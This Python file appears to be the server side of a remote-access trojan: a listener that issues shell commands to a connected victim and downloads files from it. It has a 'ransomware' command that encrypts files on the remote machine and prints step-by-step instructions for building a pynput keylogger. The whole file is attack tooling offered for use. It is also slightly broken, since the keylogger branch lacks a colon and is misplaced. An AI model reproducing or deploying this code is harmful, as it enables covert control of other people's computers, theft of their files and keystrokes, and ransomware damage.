import socket
import sys
import os
import random
import string
import time
import secrets


# Get hostname 
h_name = socket.gethostname()
ipaddr = socket.gethostbyname(h_name)


# Socket host address and port
HOST = sys.argv[1] if len(sys.argv) > 1 else ipaddr # Go into your Router settings to setup port forwarding if you want to use it outside of your local network
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 2022) # Enter this port when asked which port is to be forwarded


# Make socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)


# Waiting for input
while True:
    print(f'[*] listening as {HOST}:{PORT}')
    client = s.accept()
    print(f'[*] Client connected {client[1]}')
    client[0].send('Наше дело правое, победа будет за нами!'.encode())


    while True:
        # cmd = input('╰─➤ ')
        # cmd = input('─➤ ')
        cmd = input('$ ')
        # cmd = input('>>> ')
        client[0].send(cmd.encode())


        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break


        if cmd.lower() in ['h', 'help']:
            print('[h, help] Displays this help\n[down, download] Usage <down> lets you download files from the remote System\n[rw, encrypt, ransomware] Usage <rw, encrypt, ransomware> encrypts all .txt, .log files on the remote system, you can add more extensions if you want')
            continue


        # This will close the connection because tcp doesnt know when the end of the file is reached so it keeps waiting for data which means the shell cannot be used anymore and it has to be killed
        if cmd.lower() in ['down', 'download']:
            yesNo = input('This will close the connection are you sure you want to do this? Y/n\n')
            if yesNo.lower() in ['y', 'yes']:
                print("\033c", end='')
                client[0].send('y'.encode())
                sep = '#SEP#'
                which = input('File:\n')
                print("\033c", end='')
                file1 = client[0].send(which.encode())
                file, file_size = client[0].recv(1024).decode().split(sep)
                file_name = os.path.basename(file)
                file_size = int(file_size)
                with open(file_name, 'wb') as f:
                    bytes_recv = client[0].recv(1024)
                    while bytes_recv:
                        f.write(bytes_recv)
                        bytes_recv = client[0].recv(1024)
                print('Download complete closing...')
                client[0].close()
                print("\033c", end='')
                break
                sys.stderr = object
            else:
                client[0].send('n'.encode())
                continue


        if cmd.lower() in ['rw', 'encrypt', 'ransomware']:
            if client[0].recv(1024).decode() == 'nnt':
                print('The Target isnt on Windows...')
                continue
            else:
                hostname = client[0].recv(1024).decode()
                output = client[0].recv(1024).decode()
                print(hostname)
                print(output)
                sys.stderr = object


        # To add your own command remove the # below and change alias with the command alias and command with the command name
        # Make sure to add it to Client.py as well
        # if cmd.lower() in ['alias', 'command']:   
            # output = client[0].recv(1024).decode()
            # print(f'your text here {output}')


        result = client[0].recv(1024).decode()
        print(result)

    if cmd.lower() in ['keylogger', 'kl']
        print('run this first \npip install pynput')
        print('then this \necho exec("""\nimport os\nimport logging\nfrom pynput.keyboard import Listener\n\nif os.name != "nt":\n    pass\n\nif os.name == "nt": # WINDOWS ONLY\n    log_dir = f"{os.path.expanduser("~")}\\\\logdir" # Add the directory where the file will be saved, add it like this C:\\\\dir\\\\dir2\\\\dir3\\\\\nelif os.name == "posix": # LINUX ONLY\n    log_dir = f"{os.path.expanduser("~")}/logdir" # Add the directory where the file will be saved, add it like this /dir1/dir2/dir3\n\nlogging.basicConfig(filename=(log_dir + "Out"), level=logging.DEBUG, format="%(asctime)s: %(message)s")\n\n\ndef on_press(key):\n    logging.info(str(key))\n\nwith Listener(on_press=on_press) as listener:\n    listener.join()\n""") >> test.py')
        print('and after that you can run python3 test.py')


    client[0].close()
    cmd = input('Wait for new client Y/n ') or 'y'
    print("\033c", end='')
    if cmd.lower() in ['n', 'no']:
        break


s.close()
